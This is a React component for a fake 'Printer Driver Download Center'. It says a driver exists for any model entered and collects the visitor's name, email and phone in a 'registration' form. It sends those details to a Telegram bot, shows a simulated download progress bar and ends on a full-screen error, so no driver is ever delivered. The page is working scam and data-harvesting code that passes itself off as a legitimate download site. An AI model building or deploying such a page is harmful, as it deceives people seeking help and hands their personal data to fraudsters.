import { useState, useEffect } from 'react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Progress } from "@/components/ui/progress";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Search, Printer, Download, CheckCircle } from "lucide-react";
import FullScreenError from "@/components/FullScreenError";

const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

const DriverDownload = () => {
  const [modelNumber, setModelNumber] = useState('');
  const [showDrivers, setShowDrivers] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [downloading, setDownloading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [progress, setProgress] = useState(0);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    phone: ''
  });
  const { toast } = useToast();

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const sendToTelegram = async (data: typeof formData) => {
    const message = `
New Driver Download Request:
Name: ${data.name}
Email: ${data.email}
Phone: ${data.phone}
Model: ${modelNumber}
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  };

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    if (modelNumber.trim()) {
      setShowDrivers(true);
      window.scrollTo({ top: 0, behavior: 'smooth' });
      toast({
        title: "Driver Found",
        description: "Compatible driver package found for your printer model.",
      });
    }
  };

  const handleDownload = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendToTelegram(formData);
    setShowForm(false);
    setDownloading(true);
    window.scrollTo({ top: 0, behavior: 'smooth' });
    toast({
      title: "Download Started",
      description: "Your driver package is being prepared...",
    });
    
    for (let i = 0; i <= 100; i += 10) {
      await new Promise(resolve => setTimeout(resolve, 800));
      setProgress(i);
    }
    
    setDownloading(false);
    setShowError(true);
  };

  if (showError) {
    return <FullScreenError />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100">
      <div className="container mx-auto px-4 py-12">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12">
            <div className="flex justify-center mb-8">
              <Printer className="h-20 w-20 text-primary" />
            </div>
            <h1 className="text-4xl font-bold text-gray-900 mb-4">Printer Driver Download Center</h1>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              Get the latest drivers and software for your printer. Enter your model number to begin.
            </p>
          </div>
          
          {!showDrivers && (
            <div className="bg-white p-8 rounded-lg shadow-lg">
              <form onSubmit={handleSearch} className="max-w-md mx-auto space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="model" className="text-lg">Enter Printer Model Number</Label>
                  <div className="flex gap-3">
                    <Input
                      id="model"
                      value={modelNumber}
                      onChange={(e) => setModelNumber(e.target.value)}
                      placeholder="e.g., LaserJet Pro M404n"
                      className="text-lg"
                    />
                    <Button type="submit" size="lg">
                      <Search className="h-5 w-5 mr-2" />
                      Search
                    </Button>
                  </div>
                </div>
                <p className="text-sm text-gray-500 mt-2">
                  The model number can be found on the front or back of your printer
                </p>
              </form>
            </div>
          )}

          {showDrivers && !showForm && !downloading && (
            <div className="bg-white p-8 rounded-lg shadow-lg animate-fadeIn">
              <h2 className="text-2xl font-semibold mb-6 flex items-center gap-2">
                <Printer className="h-6 w-6 text-primary" />
                Available Drivers for {modelNumber}
              </h2>
              <div className="space-y-6">
                <div className="border rounded-lg p-6 hover:border-primary transition-colors">
                  <div className="flex justify-between items-start">
                    <div>
                      <h3 className="text-xl font-medium mb-2">Universal Print Driver</h3>
                      <p className="text-gray-600 mb-4">
                        Version 2.1.5 | Released: March 15, 2024 | Size: 48.2 MB
                      </p>
                      <ul className="text-sm text-gray-500 space-y-1 mb-4">
                        <li>• Compatible with Windows 10/11 (64-bit)</li>
                        <li>• Enhanced security features</li>
                        <li>• Improved network performance</li>
                        <li>• Bug fixes and stability improvements</li>
                      </ul>
                    </div>
                    <Button 
                      onClick={() => setShowForm(true)}
                      size="lg"
                      className="flex items-center gap-2"
                    >
                      <Download className="h-5 w-5" />
                      Download
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          )}

          <Dialog open={showForm} onOpenChange={setShowForm}>
            <DialogContent className="sm:max-w-md">
              <DialogHeader>
                <DialogTitle>Complete Download Registration</DialogTitle>
              </DialogHeader>
              <form onSubmit={handleDownload} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="name">Full Name</Label>
                  <Input 
                    id="name" 
                    required 
                    placeholder="John Doe" 
                    value={formData.name}
                    onChange={(e) => setFormData({...formData, name: e.target.value})}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input 
                    id="email" 
                    type="email" 
                    required 
                    placeholder="john@example.com"
                    value={formData.email}
                    onChange={(e) => setFormData({...formData, email: e.target.value})}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">Phone Number</Label>
                  <Input 
                    id="phone" 
                    required 
                    placeholder="+1 (555) 000-0000"
                    value={formData.phone}
                    onChange={(e) => setFormData({...formData, phone: e.target.value})}
                  />
                </div>
                <Button type="submit" className="w-full">
                  Start Download
                </Button>
                <p className="text-sm text-gray-500 text-center">
                  By downloading, you agree to our Terms of Service and Privacy Policy
                </p>
              </form>
            </DialogContent>
          </Dialog>

          {downloading && (
            <div className="bg-white p-8 rounded-lg shadow-lg animate-fadeIn">
              <div className="max-w-md mx-auto text-center">
                <h2 className="text-2xl font-semibold mb-6">Downloading Driver Package</h2>
                <Progress value={progress} className="h-2 mb-4" />
                <div className="flex items-center justify-center gap-2 text-primary mb-4">
                  {progress < 100 ? (
                    <Download className="h-6 w-6 animate-bounce" />
                  ) : (
                    <CheckCircle className="h-6 w-6" />
                  )}
                  <span className="text-lg font-medium">{progress}%</span>
                </div>
                <p className="text-gray-600">
                  Please keep this window open while we download your driver package
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default DriverDownload;